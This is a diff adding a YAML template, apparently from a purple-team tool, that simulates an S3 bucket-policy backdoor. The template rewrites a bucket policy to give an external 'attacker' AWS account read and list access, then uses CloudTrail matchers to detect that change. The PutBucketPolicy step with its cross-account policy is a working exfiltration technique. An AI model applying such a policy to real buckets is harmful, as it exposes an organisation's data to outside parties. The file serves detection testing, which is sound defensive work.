@@ -1,0 +1,106 @@
+id: purpleloop-s3-bucket-policy-backdoor
+
+info:
+  name: S3 Bucket Policy Backdoor — Open Bucket for External Access
+  author: PurpleLoop
+  severity: critical
+  description: |
+    Simulates an attacker modifying the S3 bucket policy to grant public or
+    cross-account access, enabling persistent exfiltration without needing
+    compromised credentials again.  This is a defense evasion + exfiltration
+    technique seen in major cloud breaches.
+  reference:
+    - https://attack.mitre.org/techniques/T1537/
+    - https://attack.mitre.org/techniques/T1222/
+  tags: aws,s3,exfiltration,defense-evasion,bucket-policy,cloudtrail
+  metadata:
+    mitre_attack:
+      tactic: "TA0010 - Exfiltration"
+      technique: "T1537 - Transfer Data to Cloud Account"
+    purpleloop:
+      attack_chain: s3-exfil
+      variant: bucket-policy-backdoor
+      severity_score: 9.5
+
+attack:
+  type: aws-api
+  steps:
+    # Step 1 — Read current policy
+    - action: s3:GetBucketPolicy
+      description: Read existing bucket policy before modification
+      parameters:
+        Bucket: "{{target_bucket}}"
+      delay: "{{delay_seconds}}"
+      cloudtrail_event:
+        eventName: GetBucketPolicy
+        eventSource: s3.amazonaws.com
+        sourceIPAddress: "{{source_ip}}"
+        userAgent: "{{user_agent}}"
+        requestParameters:
+          bucketName: "{{target_bucket}}"
+
+    # Step 2 — Inject wildcard principal into policy
+    - action: s3:PutBucketPolicy
+      description: Replace bucket policy with one granting access to external account
+      parameters:
+        Bucket: "{{target_bucket}}"
+        Policy: |
+          {
+            "Version": "2012-10-17",
+            "Statement": [{
+              "Sid": "ExternalAccess",
+              "Effect": "Allow",
+              "Principal": {"AWS": "arn:aws:iam::{{attacker_account}}:root"},
+              "Action": ["s3:GetObject", "s3:ListBucket"],
+              "Resource": [
+                "arn:aws:s3:::{{target_bucket}}",
+                "arn:aws:s3:::{{target_bucket}}/*"
+              ]
+            }]
+          }
+      delay: "{{delay_seconds}}"
+      cloudtrail_event:
+        eventName: PutBucketPolicy
+        eventSource: s3.amazonaws.com
+        sourceIPAddress: "{{source_ip}}"
+        userAgent: "{{user_agent}}"
+        requestParameters:
+          bucketName: "{{target_bucket}}"
+          bucketPolicy:
+            Statement:
+              - Sid: ExternalAccess
+                Effect: Allow
+                Principal:
+                  AWS: "arn:aws:iam::{{attacker_account}}:root"
+
+matchers:
+  - type: cloudtrail
+    name: bucket-policy-modified
+    condition: and
+    fields:
+      - eventName == "PutBucketPolicy"
+  - type: cloudtrail
+    name: external-principal-added
+    condition: and
+    fields:
+      - eventName == "PutBucketPolicy"
+      - requestParameters.bucketPolicy.Statement[*].Principal.AWS != target_account
+
+extractors:
+  - type: json
+    name: backdoored-bucket
+    json:
+      - ".requestParameters.bucketName"
+  - type: json
+    name: external-principal
+    json:
+      - ".requestParameters.bucketPolicy.Statement[0].Principal.AWS"
+
+variables:
+  delay_seconds: "1"
+  source_ip: "198.51.100.42"
+  user_agent: "aws-cli/2.15.0 Python/3.11.6 Linux/5.15.0"
+  session_name: "red-team-sim"
+  target_account: "123456789012"
+  target_bucket: "company-sensitive-data"
+  attacker_account: "987654321098"
